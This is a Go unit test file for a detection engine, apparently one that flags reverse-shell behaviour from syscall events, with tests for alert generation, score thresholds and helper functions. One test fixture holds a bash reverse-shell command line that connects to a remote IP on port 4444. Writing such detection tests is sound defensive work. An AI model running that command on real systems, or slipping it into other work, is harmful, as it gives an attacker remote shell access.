package detection

import (
	"net"
	"testing"
	"time"

	"go.uber.org/zap"

	"github.com/yoursec/rsbp/internal/correlation"
	"github.com/yoursec/rsbp/internal/types"
)

func TestEvaluateGeneratesAlert(t *testing.T) {
	eng := NewEngine(Config{ExecConnectWindowSeconds: 10, MinScore: 0.55}, zap.NewNop())
	state := &correlation.SessionState{
		PID:           4321,
		PPID:          1,
		UID:           1000,
		GID:           1000,
		ExePath:       "/bin/bash",
		Cmdline:       "bash -i >& /dev/tcp/8.8.8.8/4444 0>&1",
		HasExecve:     true,
		HasSocket:     true,
		HasConnect:    true,
		HasDupToStdio: true,
		RemoteIP:      net.ParseIP("8.8.8.8"),
		RemotePort:    4444,
		StartTime:     time.Now().Add(-2 * time.Second),
		LastUpdate:    time.Now(),
		Category:      1,
	}
	ev := types.SyscallEvent{SyscallNr: 42, TimestampNS: uint64(time.Now().UnixNano())}

	alerts := eng.Evaluate(state, ev, "host-a")
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].HostID != "host-a" {
		t.Fatalf("unexpected host id: %s", alerts[0].HostID)
	}
	if alerts[0].Severity == "" {
		t.Fatalf("severity should be populated")
	}
	if alerts[0].SessionID == "" || alerts[0].AlertID == "" || alerts[0].CorrelationID == "" {
		t.Fatalf("expected alert IDs to be populated")
	}
}

func TestEvaluateSuppressedWhenBelowMinScore(t *testing.T) {
	eng := NewEngine(Config{ExecConnectWindowSeconds: 10, MinScore: 0.9}, zap.NewNop())
	state := &correlation.SessionState{
		PID:        55,
		ExePath:    "/bin/customtool",
		HasExecve:  true,
		HasConnect: true,
		RemoteIP:   net.ParseIP("8.8.8.8"),
		RemotePort: 443,
		StartTime:  time.Now().Add(-2 * time.Second),
		LastUpdate: time.Now(),
	}
	ev := types.SyscallEvent{SyscallNr: 42, TimestampNS: uint64(time.Now().UnixNano())}
	if got := eng.Evaluate(state, ev, "host"); len(got) != 0 {
		t.Fatalf("expected no alerts due to min score gate")
	}
}

func TestBehaviorScoreWindowAndBranches(t *testing.T) {
	eng := NewEngine(Config{ExecConnectWindowSeconds: 2, MinScore: 0.1}, zap.NewNop())

	late := &correlation.SessionState{
		HasExecve:  true,
		HasConnect: true,
		StartTime:  time.Now().Add(-10 * time.Second),
		LastUpdate: time.Now(),
	}
	if score := eng.behaviorScore(late); score != 0 {
		t.Fatalf("expected zero score when window exceeded, got %f", score)
	}

	full := &correlation.SessionState{
		ExePath:         "/usr/bin/python3",
		Cmdline:         "python3 -c import socket",
		HasExecve:       true,
		HasSocket:       true,
		HasConnect:      true,
		HasDupToStdio:   true,
		HasForkWithPipe: true,
		Category:        2,
		RemoteIP:        net.ParseIP("8.8.8.8"),
		RemotePort:      9001,
		StartTime:       time.Now().Add(-1 * time.Second),
		LastUpdate:      time.Now(),
	}
	if score := eng.behaviorScore(full); score <= 0.9 {
		t.Fatalf("expected high score for rich behavior, got %f", score)
	}
}

func TestHelperFunctions(t *testing.T) {
	id := buildAlertID("session-1", 123, 42)
	if len(id) == 0 || id[:5] != "rsbp-" {
		t.Fatalf("unexpected alert id: %s", id)
	}
	cid := buildCorrelationID("seed")
	if len(cid) == 0 {
		t.Fatalf("expected correlation id")
	}

	state := &correlation.SessionState{
		ExePath:         "/bin/bash",
		HasExecve:       true,
		HasSocket:       true,
		HasConnect:      true,
		HasDupToStdio:   true,
		HasForkWithPipe: true,
		ProcessTree: []correlation.ProcessNode{
			{Comm: "bash"},
		},
	}
	chain := correlatedChain(state)
	if len(chain) != 5 {
		t.Fatalf("expected full chain, got %v", chain)
	}
	if comm := processComm(state); comm != "bash" {
		t.Fatalf("unexpected process comm: %s", comm)
	}
	if comm := processComm(&correlation.SessionState{ExePath: "/usr/bin/python3"}); comm != "python3" {
		t.Fatalf("expected basename fallback, got %s", comm)
	}
	if comm := processComm(&correlation.SessionState{RemoteIP: net.IPv4zero}); comm != "unknown" {
		t.Fatalf("expected unknown comm fallback, got %s", comm)
	}
}
